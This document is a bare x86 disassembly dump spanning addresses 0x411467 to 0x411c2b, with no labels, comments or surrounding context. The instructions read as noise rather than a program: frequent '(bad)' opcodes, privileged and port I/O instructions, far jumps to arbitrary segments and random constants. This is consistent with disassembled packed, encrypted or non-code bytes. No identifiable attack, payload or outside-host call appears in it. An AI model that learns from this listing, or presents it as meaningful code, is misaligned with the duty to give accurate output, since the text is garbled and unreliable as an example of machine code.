  411467:	mov    eax,0xdcf033bd
  41146c:	je     0x4114c5
  41146e:	ret    
  41146f:	pop    ecx
  411470:	xor    eax,DWORD PTR [eax+0x3335d76e]
  411476:	les    esi,FWORD PTR [ebx]
  411478:	retf   0x3afe
  41147b:	mov    fs,eax
  41147d:	imul   edi,DWORD PTR [edi+0x70],0xae5adb06
  411484:	iret   
  411485:	xor    dh,bh
  411487:	pop    esi
  411488:	mov    al,ds:0xa5133428
  41148d:	repnz inc eax
  41148f:	pusha  
  411490:	xor    ecx,edx
  411492:	mov    ebx,0x991c124c
  411497:	xor    eax,0xf13308f0
  41149c:	shl    DWORD PTR [esi],cl
  41149e:	or     bh,ch
  4114a0:	aam    0xd4
  4114a2:	pop    ecx
  4114a3:	pusha  
  4114a4:	and    DWORD PTR [ecx+0x57],ebx
  4114a7:	(bad)  
  4114a8:	dec    edx
  4114a9:	clc    
  4114aa:	or     al,0x53
  4114ac:	aam    0x3a
  4114ae:	call   0xe35ebca8
  4114b3:	dec    eax
  4114b4:	nop
  4114b5:	jbe    0x4114c3
  4114b7:	ins    DWORD PTR es:[edi],dx
  4114b8:	pop    ds
  4114b9:	(bad)  
  4114bb:	fdivr  DWORD PTR [ecx+0x61]
  4114be:	add    al,0x1f
  4114c0:	inc    ebx
  4114c1:	push   ebp
  4114c2:	pop    ebx
  4114c3:	mov    al,0xb6
  4114c5:	mov    edi,0x8327a391
  4114ca:	jb     0x41147e
  4114cc:	sub    ah,al
  4114ce:	cli    
  4114cf:	pop    ecx
  4114d0:	dec    edi
  4114d1:	and    ecx,DWORD PTR ds:0x3732f4d6
  4114d7:	push   ebp
  4114d8:	iret   
  4114d9:	push   esi
  4114da:	std    
  4114db:	test   ecx,edi
  4114dd:	mov    eax,DWORD PTR [edi+eax*2]
  4114e0:	(bad)  
  4114e1:	hlt    
  4114e2:	mov    al,0xa8
  4114e4:	imul   edi,DWORD PTR [edx],0x3cddb441
  4114ea:	and    al,0x37
  4114ec:	cmc    
  4114ed:	xchg   ecx,eax
  4114ee:	pushf  
  4114ef:	jns    0x41153a
  4114f1:	(bad)  
  4114f2:	arpl   WORD PTR [edx+0x1b7c1762],dx
  4114f8:	mov    WORD PTR [eax],es
  4114fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114fb:	and    edx,DWORD PTR [eax-0x7da0fa78]
  411501:	hlt    
  411502:	jle    0x4114e1
  411504:	sub    ebp,DWORD PTR [esi+0x32f15ada]
  41150a:	sbb    eax,DWORD PTR [ecx-0x38]
  41150d:	call   0x9db1:0x178e979b
  411514:	mov    ecx,DWORD PTR [edi+0x56630f4e]
  41151a:	loop   0x4114e7
  41151c:	sub    eax,0xd0d3c10c
  411521:	dec    esp
  411522:	mov    esi,0x6503210
  411527:	ins    BYTE PTR es:[edi],dx
  411528:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41152a:	cmp    eax,ecx
  41152c:	mov    eax,ds:0x7de64c02
  411531:	ret    
  411532:	cmp    eax,DWORD PTR [ecx+0x1d0628ff]
  411538:	xchg   ecx,eax
  411539:	in     al,0xb
  41153b:	rol    DWORD PTR [ebx-0x64814a16],1
  411541:	pop    eax
  411542:	stos   BYTE PTR es:[edi],al
  411543:	mov    cl,0xa2
  411545:	pushf  
  411546:	es jge 0x4115b3
  411549:	fidiv  WORD PTR [edx+0x378526d]
  41154f:	fs int 0xb7
  411552:	sbb    eax,0xf08e39a2
  411557:	or     DWORD PTR [edi-0x40201c91],esi
  41155d:	xchg   ecx,eax
  41155e:	in     eax,0xde
  411560:	std    
  411561:	imul   ebp,eax,0xce40ec98
  411567:	sub    ecx,DWORD PTR [edi+0x117ba1ee]
  41156d:	xchg   edx,eax
  41156e:	and    edi,DWORD PTR [edi]
  411570:	sbb    al,0x4
  411572:	fld    TBYTE PTR ds:0xacbca5c0
  411578:	dec    edi
  411579:	sahf   
  41157a:	jnp    0x4115c3
  41157c:	mov    al,0xca
  41157e:	jae    0x41150d
  411580:	fucom  st(7)
  411582:	int    0x7f
  411584:	lods   al,BYTE PTR ds:[esi]
  411585:	sahf   
  411586:	mov    ecx,DWORD PTR [edx+edi*2-0x3c]
  41158a:	xchg   BYTE PTR [edx-0x20],dh
  41158d:	lahf   
  41158e:	dec    eax
  41158f:	ja     0x4115ae
  411591:	pop    ds
  411592:	dec    ecx
  411593:	mov    ah,0xac
  411595:	outs   dx,BYTE PTR ds:[esi]
  411596:	sti    
  411597:	nop
  411598:	jno    0x411520
  41159a:	call   0x825762da
  41159f:	pop    edx
  4115a0:	jmp    DWORD PTR [ebp-0x16153c6b]
  4115a6:	cmp    bl,cl
  4115a8:	aad    0x79
  4115aa:	add    eax,0xe65c48e0
  4115af:	or     eax,0x80ff2555
  4115b4:	cs dec ecx
  4115b6:	cs inc ebx
  4115b8:	push   ebp
  4115b9:	ficomp DWORD PTR [ecx+0x65]
  4115bc:	xor    edx,DWORD PTR [ecx-0xb]
  4115bf:	mov    dl,0x7f
  4115c1:	mov    ah,0x25
  4115c3:	int    0xbc
  4115c5:	ins    BYTE PTR es:[edi],dx
  4115c6:	and    DWORD PTR [ebp-0x32],ecx
  4115c9:	cwde   
  4115ca:	daa    
  4115cb:	mov    ah,0x86
  4115cd:	dec    edi
  4115ce:	cmp    al,0x41
  4115d0:	jmp    0x411587
  4115d2:	pop    esp
  4115d3:	add    BYTE PTR [ecx],0x4d
  4115d6:	ja     0x411576
  4115d8:	lock sbb ch,bh
  4115db:	cmp    eax,0xe8f61317
  4115e0:	jle    0x41161d
  4115e2:	pop    edi
  4115e3:	leave  
  4115e4:	jge    0x411637
  4115e6:	mov    esi,0x5dc6f282
  4115eb:	push   ebp
  4115ec:	popf   
  4115ed:	cmp    esi,DWORD PTR [edx+eax*8+0x4d]
  4115f1:	inc    ebx
  4115f2:	stos   BYTE PTR es:[edi],al
  4115f3:	mov    dh,BYTE PTR [eax-0x40e75647]
  4115f9:	lds    edi,FWORD PTR [edi]
  4115fb:	jns    0x411674
  4115fd:	cmp    DWORD PTR [esi-0x62bde8ff],ebp
  411603:	fiadd  WORD PTR [edx]
  411605:	call   FWORD PTR [edi-0x11]
  411608:	es mov edx,0xc2cf58c6
  41160e:	or     dl,0x3a
  411611:	xchg   edx,eax
  411612:	inc    ebx
  411613:	int3   
  411614:	mov    edx,0x60c043a6
  411619:	mov    esi,ebp
  41161b:	push   DWORD PTR [ebx-0x4d]
  41161e:	sbb    BYTE PTR [ecx+0x7822f8fc],dl
  411624:	or     al,0xb6
  411626:	js     0x4115e0
  411628:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41162a:	pop    edi
  41162b:	aam    0x1
  41162d:	push   DWORD PTR [edi]
  41162f:	jecxz  0x411688
  411631:	pop    esi
  411632:	popf   
  411633:	ss cld 
  411635:	sbb    ah,ch
  411637:	jmp    0x41169a
  411639:	iret   
  41163a:	and    BYTE PTR [eax-0x6c27372c],ch
  411640:	into   
  411641:	in     eax,0x52
  411643:	push   0x4a06a35b
  411648:	lahf   
  411649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41164a:	or     esp,esi
  41164c:	pop    eax
  41164d:	pop    esp
  41164e:	icebp  
  41164f:	inc    edi
  411650:	sub    eax,0x72aa6755
  411655:	push   esp
  411656:	add    DWORD PTR [ecx+0x79],esi
  411659:	arpl   WORD PTR [esi-0x4fa137a2],si
  41165f:	int3   
  411660:	imul   ebx,ebx,0x6b2da34e
  411666:	cmp    dl,dh
  411668:	xchg   BYTE PTR [esi-0x2116d3b4],dl
  41166e:	daa    
  41166f:	icebp  
  411670:	mov    ebp,0x43b62ef
  411675:	dec    esp
  411676:	repz add eax,0xa6fa7471
  41167c:	and    eax,0x87ae414a
  411681:	ret    0x345f
  411684:	es inc ebx
  411686:	add    bh,BYTE PTR [edx]
  411688:	sbb    ecx,0x2efc9c5f
  41168e:	ret    
  41168f:	ins    BYTE PTR es:[edi],dx
  411690:	fdivr  QWORD PTR [eax+0x12]
  411693:	adc    al,0x3d
  411695:	lods   al,BYTE PTR ds:[esi]
  411696:	dec    ebx
  411697:	cld    
  411698:	pop    ecx
  411699:	mov    esi,0x861441e1
  41169e:	jno    0x4116a2
  4116a0:	(bad)  
  4116a1:	cwde   
  4116a2:	mov    ch,0xfc
  4116a4:	xor    DWORD PTR [ecx+0x79],esi
  4116a7:	push   0xfcd1ebe7
  4116ac:	xor    ebp,DWORD PTR [ebp-0x2be06a2a]
  4116b2:	mov    al,ds:0x68991a8c
  4116b7:	mov    ebp,0xfe1d65f8
  4116bc:	out    0xe1,al
  4116be:	das    
  4116bf:	retf   0x9a44
  4116c2:	cmp    ebp,DWORD PTR [ebx+eiz*1-0x60]
  4116c6:	jnp    0x41166e
  4116c8:	mov    cl,0xde
  4116ca:	dec    esp
  4116cb:	ins    DWORD PTR es:[edi],dx
  4116cc:	jae    0x4116bf
  4116ce:	les    esi,FWORD PTR [edx]
  4116d0:	iret   
  4116d1:	cwde   
  4116d2:	dec    ecx
  4116d3:	cs iret 
  4116d5:	xlat   BYTE PTR ds:[ebx]
  4116d6:	and    al,0xfc
  4116d8:	std    
  4116d9:	aaa    
  4116da:	xor    eax,DWORD PTR [edx-0x5bae3ba3]
  4116e0:	xchg   edi,eax
  4116e1:	mov    eax,0x899bcb26
  4116e6:	mov    cl,0xc8
  4116e8:	mov    ds:0x24ecb952,al
  4116ed:	test   BYTE PTR [eax+0x7b61d8e2],ah
  4116f3:	pop    ds
  4116f4:	pop    edi
  4116f5:	jbe    0x4116f3
  4116f7:	jbe    0x4116e9
  4116f9:	(bad)  
  4116fa:	in     al,dx
  4116fb:	pop    ds
  4116fc:	push   esi
  4116fd:	cmp    dh,ch
  4116ff:	push   eax
  411700:	mov    dl,0x33
  411702:	xchg   ecx,eax
  411703:	jmp    0x411742
  411705:	data16 repz sahf 
  411708:	mov    WORD PTR [edx+0x4e],cs
  41170b:	(bad)  
  41170c:	xchg   esi,eax
  41170d:	popa   
  41170e:	and    eax,0x3a3f418b
  411713:	pop    ds
  411714:	mov    al,0x39
  411716:	mov    dh,0x24
  411718:	fidiv  DWORD PTR [edi-0x7b]
  41171b:	sub    dl,bl
  41171d:	inc    ebp
  41171e:	push   edi
  41171f:	ins    DWORD PTR es:[edi],dx
  411720:	jb     0x41176d
  411722:	sub    ebp,DWORD PTR [eax+ebp*4-0x52]
  411726:	or     eax,0xd043b78d
  41172b:	pop    ebx
  41172c:	ds mov edi,0xa9f2d59a
  411732:	loop   0x4116bc
  411734:	or     DWORD PTR [edx-0x49],eax
  411737:	dec    esp
  411738:	fisubr DWORD PTR [ebp+0x2e]
  41173b:	call   0xca75:0xcd9956c
  411742:	push   ebx
  411743:	dec    esi
  411744:	add    BYTE PTR [ebp-0x1e7cf477],ah
  41174a:	pushf  
  41174b:	repz test eax,0x4ae7765
  411751:	adc    esi,eax
  411753:	sbb    eax,0xee080f2d
  411758:	fs shl ah,0x36
  41175c:	mov    esp,0xe02c705e
  411761:	(bad)  
  411762:	or     eax,0x3c909c0c
  411767:	in     al,dx
  411768:	cs dec esp
  41176a:	push   ecx
  41176b:	xchg   BYTE PTR [ebx+0x75587ccf],ch
  411771:	xchg   edx,eax
  411772:	and    esi,DWORD PTR [ecx-0x2ce66cdd]
  411778:	push   0x46f9cc75
  41177d:	sub    eax,DWORD PTR [edx-0x26]
  411780:	hlt    
  411781:	fistp  QWORD PTR [ecx+eax*8-0x223e5338]
  411788:	xchg   esi,esp
  41178a:	fimul  WORD PTR [esi+0x1e9bb047]
  411790:	sbb    eax,ebp
  411792:	lods   al,BYTE PTR ds:[esi]
  411793:	popf   
  411794:	or     eax,DWORD PTR [eax]
  411796:	fdiv   DWORD PTR [esi+0x77]
  411799:	mov    ebp,0x63ee2de9
  41179e:	cdq    
  41179f:	mov    ds:0x2101e6f3,eax
  4117a4:	bnd jmp 0x4117c2
  4117a7:	and    DWORD PTR [edx+0x4],esp
  4117aa:	pop    ds
  4117ab:	pusha  
  4117ac:	xor    esp,DWORD PTR [edx]
  4117ae:	fs arpl di,ax
  4117b1:	jl     0x41178c
  4117b3:	push   ds
  4117b4:	icebp  
  4117b5:	dec    BYTE PTR [ecx+0x608790ab]
  4117bb:	cdq    
  4117bc:	mov    bh,0x50
  4117be:	in     al,dx
  4117bf:	mov    ch,0xd7
  4117c1:	cmp    DWORD PTR [ecx],edx
  4117c3:	ins    DWORD PTR es:[edi],dx
  4117c4:	adc    dl,dl
  4117c6:	fsubr  DWORD PTR [eax-0x28]
  4117c9:	dec    eax
  4117ca:	cli    
  4117cb:	in     eax,dx
  4117cc:	popa   
  4117cd:	mov    WORD PTR fs:[eax+ebp*8+0x1fd6aae1],gs
  4117d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d6:	stos   BYTE PTR es:[edi],al
  4117d7:	and    eax,0x5520b41f
  4117dc:	cdq    
  4117dd:	sub    al,0x65
  4117df:	outs   dx,DWORD PTR ds:[esi]
  4117e0:	mov    ch,0xc3
  4117e2:	mov    ecx,DWORD PTR [ebp*4-0x4c4ff74a]
  4117e9:	and    ebx,DWORD PTR [esp+edi*2+0x596263d5]
  4117f0:	jae    0x411817
  4117f2:	adc    al,0x6d
  4117f4:	lahf   
  4117f5:	arpl   WORD PTR [esi-0x2cbb9350],si
  4117fb:	push   esp
  4117fc:	outs   dx,BYTE PTR ds:[esi]
  4117fd:	call   0x5f5d1a1e
  411802:	inc    edx
  411803:	aam    0x8f
  411805:	inc    eax
  411806:	jg     0x411800
  411808:	stc    
  411809:	pop    ds
  41180a:	stos   BYTE PTR es:[edi],al
  41180b:	sbb    BYTE PTR [ebp+0x3f6424dd],0xce
  411812:	mov    ds,ebx
  411814:	push   ebx
  411815:	push   es
  411816:	ja     0x411839
  411818:	adc    esp,ebx
  41181a:	loop   0x411846
  41181c:	add    al,0xc2
  41181e:	adc    ch,BYTE PTR [eax+0x1d]
  411821:	mov    ds:0xa9ed82cc,al
  411826:	test   DWORD PTR [ecx],edi
  411828:	jbe    0x411870
  41182a:	mov    edi,0x1a866982
  41182f:	shl    BYTE PTR [ebx+0x4ccfc2b1],1
  411835:	cwde   
  411836:	sub    dh,BYTE PTR [ebp+0x65]
  411839:	shl    ebx,1
  41183b:	mov    BYTE PTR [esi+ecx*1+0x62c3ce7f],0x45
  411843:	fwait
  411844:	add    ebx,esi
  411846:	sub    al,0xba
  411848:	mov    bl,0x7e
  41184a:	add    bh,dh
  41184c:	sub    cl,BYTE PTR [ebx-0x1fa16f1d]
  411852:	mov    esp,0xfd537c73
  411857:	in     eax,dx
  411858:	xor    BYTE PTR [ecx+0x6e111a66],ah
  41185e:	xchg   ebx,eax
  41185f:	popa   
  411860:	dec    esi
  411861:	popa   
  411862:	and    DWORD PTR [ebx],0x3a85ce8c
  411868:	test   DWORD PTR [esi+0x60],0xee9e2c
  41186f:	in     al,0x5
  411871:	pop    ds
  411872:	xchg   ebp,eax
  411873:	lock out dx,eax
  411875:	jno    0x4118bc
  411877:	xchg   esp,eax
  411878:	mov    ebx,0xbf828d44
  41187d:	jbe    0x4118ad
  41187f:	cmp    eax,0xc94ac03b
  411884:	adc    eax,0x2cc51529
  411889:	inc    ebp
  41188a:	(bad)  
  41188b:	lea    ebx,[ebx]
  41188d:	mov    esp,0x4968c988
  411892:	scas   al,BYTE PTR es:[edi]
  411893:	lahf   
  411894:	scas   eax,DWORD PTR es:[edi]
  411895:	xchg   esp,eax
  411896:	in     al,dx
  411897:	cmovg  ebx,DWORD PTR [edi+0x6fe4d932]
  41189e:	xchg   esi,eax
  41189f:	les    eax,FWORD PTR [ecx+0x372622dc]
  4118a5:	mov    edi,0xbe4d8a78
  4118aa:	iret   
  4118ab:	jae    0x4118eb
  4118ad:	jne    0x4118a8
  4118af:	mov    al,ds:0x4b843b26
  4118b4:	test   DWORD PTR [eax-0x7],0x7e735500
  4118bb:	ret    
  4118bc:	mov    DWORD PTR [ebx-0x6bc6aa47],edx
  4118c2:	clc    
  4118c3:	ret    
  4118c4:	xor    dl,BYTE PTR [eax+0x5351e297]
  4118ca:	mov    ss,WORD PTR [edi+0x5240f669]
  4118d0:	and    bl,BYTE PTR [ebp+0x8a04f2d]
  4118d6:	gs lahf 
  4118d8:	push   0x51
  4118da:	test   al,0x2c
  4118dc:	shl    ebx,cl
  4118de:	lods   eax,DWORD PTR fs:[esi]
  4118e0:	jno    0x411950
  4118e2:	out    dx,al
  4118e3:	dec    esp
  4118e4:	xchg   eax,ecx
  4118e6:	je     0x4118d1
  4118e8:	jbe    0x41194e
  4118ea:	or     al,BYTE PTR [esi]
  4118ec:	das    
  4118ed:	add    eax,0x24cb061
  4118f2:	jns    0x4118df
  4118f4:	inc    esi
  4118f5:	jmp    0xe53f41ee
  4118fa:	xchg   esp,eax
  4118fb:	jne    0x4118f4
  4118fd:	pop    ebp
  4118fe:	retf   0xd70b
  411901:	jne    0x41188e
  411903:	(bad)  
  411904:	gs rcl DWORD PTR fs:[ebx+edx*1],0x81
  41190a:	daa    
  41190b:	add    DWORD PTR [edx],eax
  41190d:	inc    ecx
  41190e:	(bad)  
  41190f:	(bad)  
  411910:	loope  0x41192c
  411912:	(bad)  
  411913:	pushf  
  411914:	pop    ebx
  411915:	dec    edi
  411916:	add    bl,dl
  411918:	dec    ebp
  411919:	sbb    BYTE PTR [ebp+0x2c3c9ef9],ch
  41191f:	or     BYTE PTR [eax+eax*8+0xd],al
  411923:	xor    al,0x68
  411925:	push   eax
  411926:	xchg   BYTE PTR [edx-0x5],cl
  411929:	outs   dx,DWORD PTR ds:[esi]
  41192a:	(bad)  
  41192c:	mov    ss,WORD PTR [eax-0x7a1a0b57]
  411932:	pop    ebx
  411933:	fistp  WORD PTR [esi+0xa7b3330]
  411939:	jns    0x411949
  41193b:	ficom  DWORD PTR [edi+edx*2+0x4e5bee7f]
  411942:	mov    ecx,0x2de3dd7a
  411947:	push   ebx
  411948:	and    esi,DWORD PTR [edi]
  41194a:	(bad)  
  41194b:	(bad)  
  41194c:	pop    esp
  41194d:	xchg   ecx,eax
  41194e:	jo     0x4118e8
  411950:	jmp    0x411995
  411952:	jl     0x41198d
  411954:	lods   eax,DWORD PTR cs:[esi]
  411956:	iret   
  411957:	sub    al,0x8e
  411959:	(bad)  
  41195a:	dec    ebp
  41195b:	inc    edi
  41195c:	cmp    eax,0x5a220926
  411961:	add    eax,eax
  411963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411964:	lods   al,BYTE PTR ds:[esi]
  411965:	fstp   QWORD PTR [eax+ebp*2+0x2aeaefa9]
  41196c:	mov    ch,0x56
  41196e:	fidivr DWORD PTR [ebp+0xc]
  411971:	cs dec eax
  411973:	xchg   ecx,eax
  411974:	enter  0xf936,0x20
  411978:	in     eax,0xaa
  41197a:	push   esp
  41197b:	sbb    DWORD PTR [eax+0x567b61ad],ebp
  411981:	mov    ebp,0xcf51bb15
  411986:	xor    eax,0x15ac176
  41198b:	aad    0x45
  41198d:	mov    ah,0x6e
  41198f:	pusha  
  411990:	inc    edx
  411991:	and    BYTE PTR [ebx],al
  411993:	cmp    DWORD PTR [ecx+0x11],ecx
  411996:	xor    ch,dh
  411998:	pushf  
  411999:	mov    esi,0xbf9ce41
  41199e:	mov    edx,0x25b79947
  4119a3:	ja     0x411a13
  4119a5:	sbb    BYTE PTR ds:[ebx-0x34],cl
  4119a9:	lods   al,BYTE PTR ds:[esi]
  4119aa:	loopne 0x41195e
  4119ac:	push   cs
  4119ad:	fistp  QWORD PTR [ebp+0xf]
  4119b0:	push   esi
  4119b1:	inc    eax
  4119b2:	sbb    al,0x39
  4119b4:	inc    ecx
  4119b5:	pop    es
  4119b6:	outs   dx,DWORD PTR ds:[esi]
  4119b7:	xor    BYTE PTR ds:0xe444bc84,cl
  4119bd:	jns    0x41199c
  4119bf:	lahf   
  4119c0:	cmc    
  4119c1:	xchg   ebp,eax
  4119c2:	xor    esp,esi
  4119c4:	(bad)  
  4119c5:	mov    al,0x86
  4119c7:	add    al,0x5b
  4119c9:	shl    BYTE PTR [edx],cl
  4119cb:	push   cs
  4119cc:	je     0x4119de
  4119ce:	pop    edx
  4119cf:	rcr    BYTE PTR [esi],1
  4119d1:	mov    edx,0xd3ca3ff5
  4119d6:	jge    0x4119c2
  4119d8:	fxch   st(5)
  4119da:	fcomp  QWORD PTR [esi+eiz*4]
  4119dd:	mov    BYTE PTR [edi-0x3299d4ef],dh
  4119e3:	add    DWORD PTR [ebx-0x4a92e77e],edx
  4119e9:	jg     0x411997
  4119eb:	aad    0xba
  4119ed:	stos   DWORD PTR es:[edi],eax
  4119ee:	add    esp,DWORD PTR [eax]
  4119f0:	out    dx,eax
  4119f1:	test   BYTE PTR [eax],0x71
  4119f4:	push   es
  4119f5:	leave  
  4119f6:	pop    ecx
  4119f7:	xchg   esi,eax
  4119f8:	ins    BYTE PTR es:[edi],dx
  4119f9:	sbb    DWORD PTR [esi-0x63],edi
  4119fc:	xchg   esp,eax
  4119fd:	sbb    al,0x5c
  4119ff:	pop    ecx
  411a00:	cmp    al,BYTE PTR [edx]
  411a02:	mov    al,BYTE PTR [ecx]
  411a04:	and    bh,BYTE PTR [ebx+0x560865a6]
  411a0a:	xchg   ecx,eax
  411a0b:	sbb    ch,BYTE PTR [edi+ebp*1]
  411a0e:	cli    
  411a0f:	out    dx,eax
  411a10:	ja     0x411a5b
  411a12:	sbb    esi,ecx
  411a14:	clc    
  411a15:	pusha  
  411a16:	mov    edx,0xdb3f25dc
  411a1b:	inc    eax
  411a1c:	aaa    
  411a1d:	sbb    DWORD PTR [ebx+edi*1],esi
  411a20:	pop    esi
  411a21:	rcl    DWORD PTR [ebp+0x2b],1
  411a24:	sar    BYTE PTR [ecx+0xb1bf6cc],0xcb
  411a2b:	or     ch,BYTE PTR [edi-0x52306fad]
  411a31:	or     ebx,DWORD PTR cs:[eax+0x6b]
  411a35:	mov    ch,0x2a
  411a37:	mov    WORD PTR [edi-0x3b],cs
  411a3a:	push   esp
  411a3b:	jle    0x411a5a
  411a3d:	(bad)  
  411a3e:	xchg   ebp,eax
  411a3f:	mov    al,0x81
  411a41:	(bad)  
  411a42:	bound  ebx,QWORD PTR gs:0xf5570e0b
  411a49:	jle    0x4119df
  411a4b:	loope  0x411ab3
  411a4d:	(bad)  
  411a4e:	stos   DWORD PTR es:[edi],eax
  411a4f:	sbb    al,BYTE PTR [edx-0x57038d1b]
  411a55:	mov    edx,0xb79a00cf
  411a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a5b:	and    DWORD PTR [edx+0x1715e465],esp
  411a61:	add    bh,BYTE PTR [esp+ebx*8]
  411a64:	out    dx,eax
  411a65:	aas    
  411a66:	adc    edx,ecx
  411a68:	pop    es
  411a69:	stc    
  411a6a:	std    
  411a6b:	or     ebx,DWORD PTR [esi+eax*8-0x76]
  411a6f:	imul   ebx,eax,0xffffff8e
  411a72:	shl    eax,cl
  411a74:	outs   dx,DWORD PTR ds:[esi]
  411a75:	dec    esp
  411a76:	stos   DWORD PTR es:[edi],eax
  411a77:	dec    ebx
  411a78:	mov    esp,0x16392636
  411a7d:	imul   ebp,DWORD PTR [esi-0x30724e0d],0x3211699e
  411a87:	pop    esp
  411a88:	dec    ebp
  411a89:	fist   DWORD PTR [eax+edx*8]
  411a8c:	push   ecx
  411a8d:	clc    
  411a8e:	int    0x7c
  411a90:	call   0x5e81:0xac258b7d
  411a97:	sub    ebp,DWORD PTR [edx+edi*2]
  411a9a:	mov    al,ds:0xeebd76f3
  411a9f:	cmp    ah,BYTE PTR [ebx+0x13a6d564]
  411aa5:	adc    eax,0xb7c527ab
  411aaa:	mov    ax,ds:0x68590678
  411ab0:	int    0xa5
  411ab2:	mov    al,0x9a
  411ab4:	pushf  
  411ab5:	xlat   BYTE PTR ds:[ebx]
  411ab6:	mov    ebx,0xedb3043b
  411abb:	test   eax,0x14ed44da
  411ac0:	test   DWORD PTR [eax-0x71],edi
  411ac3:	jno    0x411b10
  411ac5:	dec    ecx
  411ac6:	mov    DWORD PTR [edi-0x786a1794],esp
  411acc:	mov    ds:0x7e0517e0,al
  411ad1:	inc    ebx
  411ad2:	int3   
  411ad3:	jmp    0x411b05
  411ad5:	xchg   esp,eax
  411ad6:	in     eax,dx
  411ad7:	mov    dh,0x3d
  411ad9:	enter  0xe11,0xc4
  411add:	jle    0x411b3d
  411adf:	cdq    
  411ae0:	lds    esp,FWORD PTR [edx+0x41]
  411ae3:	in     al,dx
  411ae4:	js     0x411b46
  411ae6:	clc    
  411ae7:	fnstcw WORD PTR [edi+0x1a90657]
  411aed:	jnp    0x411b65
  411aef:	xor    ah,BYTE PTR [eax+edi*4-0x2]
  411af3:	scas   eax,DWORD PTR es:[edi]
  411af4:	addr16 push esi
  411af6:	jb     0x411ac3
  411af8:	cwde   
  411af9:	ins    DWORD PTR es:[edi],dx
  411afa:	stc    
  411afb:	ror    esi,cl
  411afd:	std    
  411afe:	popa   
  411aff:	cwde   
  411b00:	cmp    eax,0xb8fcae3a
  411b05:	pusha  
  411b06:	inc    edi
  411b07:	inc    esp
  411b08:	sub    al,0x35
  411b0a:	mov    ch,al
  411b0c:	pop    edi
  411b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b0e:	fidiv  WORD PTR [edx]
  411b10:	xchg   edi,eax
  411b11:	dec    ecx
  411b12:	add    ebp,DWORD PTR [ebp+esi*2+0x13]
  411b16:	les    esp,FWORD PTR [eax+edx*8+0x1d]
  411b1a:	push   esi
  411b1b:	pop    esi
  411b1c:	mov    bh,BYTE PTR [edi-0x7f]
  411b1f:	xor    ch,BYTE PTR [edx]
  411b21:	je     0x411acc
  411b23:	imul   edx,DWORD PTR [ebp+0x25],0xd090f29b
  411b2a:	out    0x3d,eax
  411b2c:	dec    edx
  411b2d:	lock jo 0x411adb
  411b30:	sbb    al,0x12
  411b32:	jb     0x411b01
  411b34:	xlat   BYTE PTR ds:[ebx]
  411b35:	xlat   BYTE PTR ds:[ebx]
  411b36:	jle    0x411bb2
  411b38:	xchg   edx,eax
  411b39:	les    ebx,FWORD PTR [edx]
  411b3b:	outs   dx,DWORD PTR ds:[esi]
  411b3c:	out    0x14,eax
  411b3e:	data16 (bad) 
  411b41:	mov    ebx,0x7d9fdd7e
  411b46:	inc    edi
  411b47:	test   edx,eax
  411b49:	pushf  
  411b4a:	fnstenv [esi+0x4b]
  411b4d:	loop   0x411bba
  411b4f:	jmp    0x167c:0xb01a215
  411b56:	xor    eax,0x45a67749
  411b5b:	ret    0xdc2f
  411b5e:	jmp    0x5202:0x3aff1a6d
  411b65:	pusha  
  411b66:	les    edx,FWORD PTR [edx+edx*2+0x6e]
  411b6a:	xor    eax,0xf6d28d48
  411b6f:	push   es
  411b70:	lods   eax,DWORD PTR ds:[esi]
  411b71:	je     0x411b6f
  411b73:	shl    bh,1
  411b75:	dec    edx
  411b76:	out    0x14,eax
  411b78:	sub    DWORD PTR [eax-0x24],esp
  411b7b:	lahf   
  411b7c:	and    BYTE PTR [edx+0x48],cl
  411b7f:	mov    dh,0x2b
  411b81:	push   ss
  411b82:	cmc    
  411b83:	and    ebp,0x7f3dce2
  411b89:	in     eax,dx
  411b8a:	js     0x411beb
  411b8c:	add    eax,0x84f2d6db
  411b91:	jne    0x411bcc
  411b93:	scas   eax,DWORD PTR es:[edi]
  411b94:	mov    DWORD PTR [edi-0x30],0x38168b97
  411b9b:	mov    dh,0x93
  411b9d:	in     eax,0x4f
  411b9f:	mov    ch,0x60
  411ba1:	ds pop ebx
  411ba3:	mov    WORD PTR [edx+0x442474c0],?
  411ba9:	pop    ebp
  411baa:	lea    esi,[ecx]
  411bac:	int3   
  411bad:	(bad)  
  411bae:	(bad)  
  411bb0:	fs es add al,BYTE PTR es:[edx+ebx*8]
  411bb6:	jae    0x411b55
  411bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bb9:	pop    ebp
  411bba:	je     0x411c2d
  411bbc:	cmp    ch,BYTE PTR [ebp+0x3f]
  411bbf:	jmp    0x9dd6:0x94798ce9
  411bc6:	or     ah,ch
  411bc8:	and    DWORD PTR [eax+0x741d18b3],esp
  411bce:	xlat   BYTE PTR ds:[ebx]
  411bcf:	iret   
  411bd0:	push   esp
  411bd1:	xor    eax,0x5f97a167
  411bd6:	mov    bl,0x96
  411bd8:	add    BYTE PTR [eax],bl
  411bda:	fild   WORD PTR [eax-0x2c568ef3]
  411be0:	mov    eax,ds:0x610d3819
  411be5:	xchg   esp,eax
  411be6:	idiv   BYTE PTR [ebx+ebp*4+0x75]
  411bea:	fsubrp st(5),st
  411bec:	sbb    ah,al
  411bee:	mov    ds:0x49b4155,al
  411bf3:	adc    DWORD PTR [esi-0xe],edi
  411bf6:	cld    
  411bf7:	inc    ebx
  411bf8:	dec    ebp
  411bf9:	lea    ebp,[edx]
  411bfb:	fiadd  DWORD PTR [ecx+edx*8]
  411bfe:	or     eax,DWORD PTR [eax-0x3b]
  411c01:	xchg   edi,eax
  411c02:	mov    esi,0x6a88a1aa
  411c07:	outs   dx,BYTE PTR ds:[esi]
  411c08:	sub    al,0x7f
  411c0a:	or     esi,DWORD PTR [eax+0x4a724f26]
  411c10:	lods   al,BYTE PTR ds:[esi]
  411c11:	jg     0x411bda
  411c13:	xor    DWORD PTR [esi],0xb2b2ad30
  411c19:	loop   0x411c92
  411c1b:	sbb    ebx,0x1a
  411c1e:	pushf  
  411c1f:	xchg   ebx,eax
  411c20:	adc    eax,ebp
  411c22:	fidivr DWORD PTR [eax]
  411c24:	(bad)  
  411c25:	xor    DWORD PTR [ebx+0x58fcb33d],eax
  411c2b:	adc    al,0xda
